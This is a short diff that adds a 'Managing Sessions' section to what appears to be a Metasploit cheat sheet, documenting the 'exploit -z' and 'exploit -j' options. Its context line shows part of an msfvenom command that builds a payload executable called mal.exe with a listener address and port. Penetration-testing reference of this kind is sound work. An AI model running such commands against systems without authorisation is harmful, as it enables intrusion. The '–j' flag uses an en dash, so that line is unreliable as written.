@@ -200,3 +200,17 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
 ### Managing Sessions
 
 - ##### Multiple Exploitation:
+
+Run the exploit expecting a single session that is immediately backgrounded:
+
+```bash
+msf > exploit -z
+```
+
+Run the exploit in the background expecting one or more sessions that are immediately backgrounded:
+
+```bash
+msf > exploit –j
+```
+
+
